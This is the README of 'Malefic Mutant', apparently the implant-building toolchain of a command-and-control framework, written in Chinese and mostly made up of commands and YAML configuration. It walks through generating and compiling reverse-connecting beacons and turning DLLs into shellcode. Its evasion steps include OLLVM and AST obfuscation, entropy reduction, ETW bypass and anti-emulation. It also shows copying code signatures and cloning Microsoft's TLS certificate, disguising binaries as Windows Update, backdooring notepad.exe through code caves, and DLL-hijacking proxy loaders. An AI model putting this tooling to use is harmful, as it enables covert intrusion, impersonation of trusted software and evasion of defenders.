# Malefic Mutant

Malefic 生态的配置生成、编译构建与二进制后处理工具链。提供 YAML 驱动的 implant 配置生成、自动化编译、12 种 payload 编码方案，以及丰富的 PE 操作工具集。

## 架构

Mutant 采用三级命令结构：

```
mutant
├── generate   — 从 YAML 生成配置代码与 feature 标记
├── build      — 编译 payload（支持 OLLVM / zigbuild）
└── tool       — 二进制后处理工具集
```

## 快速开始

```bash
# 1. 从 implant.yaml 生成 beacon 配置
cargo run -p malefic-mutant -- generate beacon

# 2. 编译 beacon
cargo run -p malefic-mutant -- build malefic

# 3. 对产物进行编码
cargo run -p malefic-mutant -- tool encode -i malefic.exe -e aes -f bin

# 4. 转换为 shellcode (SRDI)
cargo run -p malefic-mutant -- tool srdi -i malefic.dll -o malefic.bin
```

## Generate — 配置生成

从 `implant.yaml` 读取配置，生成各组件所需的 Rust 代码与 Cargo feature 标记。

```bash
# 指定配置文件与版本
cargo run -p malefic-mutant -- generate -c implant.yaml -v community <subcommand>
```

| 子命令 | 说明 |
|--------|------|
| `beacon` | 生成 beacon（反向连接）配置代码 |
| `bind` | 生成 bind（正向监听）配置代码 |
| `prelude` | 生成 prelude stager 配置，含 spite 序列化 |
| `pulse` | 生成 pulse listener 配置（HTTP/TCP） |
| `modules -m exec,ls,upload` | 更新模块 feature 标记 |
| `loader template` | 生成模板 loader（随机或指定模板） |
| `loader proxydll` | 生成 ProxyDLL（DLL 劫持） |
| `loader patch` | PE 后门注入（BDF 风格代码洞 / 新增 section） |

### Patch Mode

```bash
cargo run -p malefic-mutant -- generate --patch-mode beacon
```

启用 `--patch-mode` 后，生成的配置禁用 `obfstr` 并保留 XOR 块，以便后续 `tool patch` 对编译产物进行字段替换。

## Build — 编译构建

```bash
# 默认目标三元组
cargo run -p malefic-mutant -- build -t x86_64-pc-windows-gnu <subcommand>

# 编译为 DLL
cargo run -p malefic-mutant -- build --lib malefic
```

| 子命令 | 说明 |
|--------|------|
| `malefic` | 编译主 beacon implant |
| `prelude` | 编译 prelude stager |
| `modules -m exec,ls` | 编译指定内置模块 |
| `3rd -m rem,curl` | 编译第三方模块 |
| `pulse` | 编译 pulse listener |
| `proxy-dll` | 编译 ProxyDLL |

### OLLVM 混淆

在 `implant.yaml` 中配置：

```yaml
build:
  ollvm:
    enable: true
    bcfobf: true     # 虚假控制流
    splitobf: true   # 基本块拆分
    subobf: true     # 指令替换
    fco: true        # 函数调用混淆
    constenc: true   # 常量加密
```

### 元数据与资源

```yaml
build:
  metadata:
    icon: "resources/app.ico"
    company_name: "Microsoft Corporation"
    product_name: "Windows Update"
    file_description: "Windows Update Service"
    file_version: "10.0.19041.1"
    original_filename: "wuauserv.exe"
    require_admin: false
    require_uac: false
```

## Tool — 二进制工具集

### Encode — Payload 编码（12 种）

```bash
# 列出所有编码方案
cargo run -p malefic-mutant -- tool encode -l

# AES 编码，输出为 Rust 源码
cargo run -p malefic-mutant -- tool encode -i payload.bin -e aes -f rust -o encoded

# 所有格式一次性输出
cargo run -p malefic-mutant -- tool encode -i payload.bin -e chacha -f all
```

| 编码方案 | 说明 |
|----------|------|
| `xor` | XOR（随机密钥） |
| `rc4` | RC4 流密码 |
| `aes` | AES-128 CBC |
| `aes2` | AES 变体 |
| `des` | DES CBC |
| `chacha` | ChaCha20 |
| `base64` | Base64 |
| `base45` | Base45 |
| `base58` | Base58 |
| `uuid` | UUID 格式编码 |
| `mac` | MAC 地址格式编码 |
| `ipv4` | IPv4 地址格式编码 |

输出格式：`bin`（二进制）、`c`（C 头文件）、`rust`（Rust 源码）、`all`（全部）。

### SRDI — 反射式 DLL 注入

将 DLL 转换为位置无关的 shellcode：

```bash
# Malefic SRDI（支持 TLS 回调）
cargo run -p malefic-mutant -- tool srdi -t malefic -i implant.dll -o implant.bin

# Link SRDI（轻量，不支持 TLS）
cargo run -p malefic-mutant -- tool srdi -t link -i implant.dll -o implant.bin --function-name DllMain

# 附带用户数据
cargo run -p malefic-mutant -- tool srdi -i implant.dll -o implant.bin --userdata-path config.bin
```

### Patch — 二进制字段热补丁

对已编译的 beacon 二进制进行字段替换，无需重新编译：

```bash
# 替换 NAME / KEY / SERVER_ADDRESS
cargo run -p malefic-mutant -- tool patch -f malefic.exe --name new_beacon --key new_key --server-address 10.0.0.1:5001

# 指定输出路径
cargo run -p malefic-mutant -- tool patch -f malefic.exe --server-address 10.0.0.1:5001 -o patched.exe
```

### Patch-Config — 运行时配置热补丁

```bash
# 从 RuntimeConfig JSON 补丁
cargo run -p malefic-mutant -- tool patch-config -f malefic.exe -c runtime.json

# 从 implant.yaml 生成并补丁
cargo run -p malefic-mutant -- tool patch-config -f malefic.exe --from-implant implant.yaml

# 直接传入预编码 blob
cargo run -p malefic-mutant -- tool patch-config -f malefic.exe --blob "Q0ZHdjNCNjQ..."
```

### SigForge — PE 签名操作

```bash
# 提取签名
cargo run -p malefic-mutant -- tool sigforge extract -i signed.exe -o sig.bin

# 复制签名（从已签名 PE 到目标 PE）
cargo run -p malefic-mutant -- tool sigforge copy -s signed.exe -t target.exe -o output.exe

# 注入签名
cargo run -p malefic-mutant -- tool sigforge inject -s sig.bin -t target.exe

# 移除签名
cargo run -p malefic-mutant -- tool sigforge remove -i target.exe -o unsigned.exe

# 检查是否已签名
cargo run -p malefic-mutant -- tool sigforge check -i target.exe

# 克隆远程 TLS 证书并注入
cargo run -p malefic-mutant -- tool sigforge carbon-copy --host www.microsoft.com -t target.exe -o output.exe
```

### Loader — 加载器生成

#### Template Loader

```bash
# 随机选择模板
cargo run -p malefic-mutant -- generate loader template -i payload.bin -e aes

# 列出可用模板
cargo run -p malefic-mutant -- generate loader template -l

# 指定模板
cargo run -p malefic-mutant -- generate loader template -t fiber_exec -i payload.bin

# 启用字符串混淆
cargo run -p malefic-mutant -- generate loader template -t func_ptr -i payload.bin --obf-strings

# 启用全部混淆（字符串 + 垃圾代码 + 内存清零）
cargo run -p malefic-mutant -- generate loader template -t func_ptr -i payload.bin -e aes --obf-full
```

混淆选项：

| 标志 | 说明 |
|------|------|
| `--obf-strings` | 编译期 AES 字符串加密（DLL 名、API 函数名等） |
| `--obf-full` | 全部混淆：字符串加密 + 垃圾代码注入 + 内存安全清零 |

#### ProxyDLL Loader

```bash
# 从命令行指定参数
cargo run -p malefic-mutant -- generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW

# 劫持 DllMain
cargo run -p malefic-mutant -- generate loader proxydll -r version.dll -p version_orig.dll --hijack-dll-main
```

#### Patch Loader（BDF 风格）

```bash
# 查找代码洞
cargo run -p malefic-mutant -- generate loader patch -f notepad.exe --find-caves

# 注入 shellcode 到代码洞
cargo run -p malefic-mutant -- generate loader patch -f notepad.exe -i payload.bin -o backdoored.exe

# 强制新增 section
cargo run -p malefic-mutant -- generate loader patch -f notepad.exe -i payload.bin --add-section --section-name .rsrc2
```

### Entropy — 熵值管理

```bash
# 测量 Shannon 熵
cargo run -p malefic-mutant -- tool entropy -i malefic.exe --measure-only

# 降低熵值（null_bytes 策略，目标 < 6.0）
cargo run -p malefic-mutant -- tool entropy -i malefic.exe -o reduced.exe -t 6.0 -s null_bytes

# Pokemon 策略（嵌入随机 Pokemon 名称）
cargo run -p malefic-mutant -- tool entropy -i malefic.exe -o reduced.exe -s pokemon
```

| 策略 | 说明 |
|------|------|
| `null_bytes` | 追加空字节 |
| `pokemon` | 嵌入 Pokemon 名称字符串 |
| `random_words` | 嵌入随机英文单词 |

### Obfuscate — 源码级混淆

```bash
# 混淆目录下所有 Rust 文件
cargo run -p malefic-mutant -- tool obf -i src/ -o obfuscated/

# 仅混淆字符串，跳过整数和控制流
cargo run -p malefic-mutant -- tool obf -i src/main.rs -o out/ --no-integers --no-flow

# 启用变量重命名，密度 5
cargo run -p malefic-mutant -- tool obf -i src/ -o out/ --rename -d 5

# 50% 字符串加密率
cargo run -p malefic-mutant -- tool obf -i src/ -o out/ -p 50
```

混淆能力：

| 功能 | 说明 |
|------|------|
| 字符串加密 | `obfstr!()` 宏包裹字符串字面量 |
| 整数混淆 | `obf_int!()` 宏包裹整数字面量 |
| 控制流混淆 | `#[junk]` 属性注入垃圾代码 |
| 变量重命名 | 局部变量与函数随机命名 |

### Watermark — PE 水印

```bash
# 写入水印
cargo run -p malefic-mutant -- tool watermark write -i target.exe -o marked.exe -m dosstub -w "TEAM-001"

# 读取水印
cargo run -p malefic-mutant -- tool watermark read -i marked.exe -m dosstub -s 8
```

| 方法 | 位置 |
|------|------|
| `checksum` | PE checksum 字段 |
| `dosstub` | DOS stub 区域 |
| `section` | 自定义 section |
| `overlay` | PE overlay 区域 |

### Binder — PE 捆绑

```bash
# 将 payload 嵌入载体 PE
cargo run -p malefic-mutant -- tool binder bind -p carrier.exe -s payload.exe -o bound.exe

# 提取嵌入的 payload
cargo run -p malefic-mutant -- tool binder extract -i bound.exe -o extracted.exe

# 检查是否包含嵌入内容
cargo run -p malefic-mutant -- tool binder check -i bound.exe
```

### Icon — 图标操作

```bash
# 替换 PE 图标
cargo run -p malefic-mutant -- tool icon replace -i target.exe --ico new_icon.ico -o output.exe

# 提取 PE 图标
cargo run -p malefic-mutant -- tool icon extract -i target.exe -o extracted.ico
```

### Strip — 路径剥离

```bash
# 剥离二进制中的编译路径
cargo run -p malefic-mutant -- tool strip -i malefic.exe -o stripped.exe

# 附加自定义路径模式
cargo run -p malefic-mutant -- tool strip -i malefic.exe -o stripped.exe --custom-paths "/home/user,C:\\build"
```

### ObjCopy — 二进制段提取

```bash
# 提取 .text 段为裸二进制
cargo run -p malefic-mutant -- tool objcopy -O binary input.o output.bin
```

## 配置文件结构

`implant.yaml` 核心字段：

```yaml
basic:
  name: "beacon_name"
  targets:
    - address: "10.0.0.1:5001"
      http:                         # HTTP 协议（省略则为 TCP）
        method: POST
        path: /api/v1
        version: "1.1"
        headers:
          User-Agent: "Mozilla/5.0"
      tls:
        enable: true
        version: "1.3"
        sni: "cdn.example.com"
  encryption: "aes"
  key: "your-encryption-key"
  cron: "*/5 * * * * * *"          # 回连间隔（cron 表达式）
  jitter: 0.2
  keepalive: false                   # 启动后是否直接进入 duplex keepalive
  retry: 3
  dga:
    enable: false
    key: "dga_seed"
    interval_hours: 2
  guardrail:
    enable: false
    ip_addresses: []
    usernames: []
    server_names: []
    domains: []

implants:
  runtime: "async"                  # async / thread
  mod: "fork"                       # fork / dynamic
  modules:
    - exec_assembly
    - execute_shellcode
    - ls
    - upload
    - download
  enable_3rd: false
  3rd_modules: []
  apis:
    level: "dynamic"
    priority:
      normal:  { enable: true, type: "win32" }
      dynamic: { enable: true, type: "lazy" }
      syscalls: { enable: false, type: "direct" }

build:
  zigbuild: false
  toolchain: "nightly-2023-09-18"
  obfstr: true
  ollvm:
    enable: false
  metadata:
    icon: ""
    company_name: ""
    product_name: ""

loader:
  proxydll:
    raw_dll: "version.dll"
    proxied_dll: "version_orig.dll"
    proxyfunc: "GetFileVersionInfoW"
  evader:
    anti_emu: true
    etw_pass: true
    god_speed: false
  obfuscate:
    strings: true       # 编译期 AES 字符串加密
    junk: true          # 垃圾代码注入
    memory: true        # Shellcode 执行后安全清零
```

## 目录结构

```
malefic-mutant/
├── Cargo.toml
├── config_lint.json               # YAML 配置 JSON Schema
├── src/
│   ├── main.rs                    # CLI 入口与命令编排
│   ├── cmd.rs                     # Clap 命令定义
│   ├── config/mod.rs              # 配置结构体定义
│   ├── logger.rs                  # 彩色日志系统
│   ├── generate/
│   │   ├── codegen.rs             # beacon/bind 配置代码生成
│   │   ├── features.rs            # Feature 标记解析与 Cargo.toml 修改
│   │   ├── cargo_features.rs      # 工作区 crate feature 管理
│   │   ├── prelude.rs             # Prelude 配置生成
│   │   ├── resources.rs           # 资源元数据生成（RC/manifest）
│   │   └── spites.rs              # Spite 二进制序列化
│   ├── build/
│   │   ├── payload/mod.rs         # Payload 编译（OLLVM / zigbuild / cargo）
│   │   └── pulse/                 # Pulse 构建生成
│   └── tool/
│       ├── encoder/               # 12 种编码方案
│       ├── loader/                # Template / ProxyDLL / Patch loader
│       ├── obfuscate/             # 源码级 AST 混淆
│       ├── pe/                    # PE 解析与 objcopy
│       ├── sigforge/              # PE 签名操作
│       ├── srdi/                  # SRDI shellcode 生成
│       ├── binder/                # PE 捆绑器
│       ├── watermark/             # PE 水印
│       ├── icon/                  # ICO 处理
│       ├── entropy/               # Shannon 熵分析与降低
│       ├── strip/                 # 路径剥离
│       ├── patch.rs               # 二进制字段补丁
│       └── proxydll/              # ProxyDLL 资源管理
```

## 依赖

| Crate | 用途 |
|-------|------|
| `malefic-proto` | 协议定义与 Protobuf 序列化 |
| `malefic-config` | 运行时配置编码 |
| `malefic-codec` | Payload 编解码（12 种算法） |
| `malefic-common` | 公共工具函数 |
| `malefic-obfuscate` | 混淆宏定义 |
| `goblin` | PE/ELF/Mach-O 二进制解析 |
| `syn` / `quote` | Rust AST 操作（源码混淆） |
| `clap` | CLI 参数解析 |
| `rustls` | TLS 证书克隆（carbon-copy） |
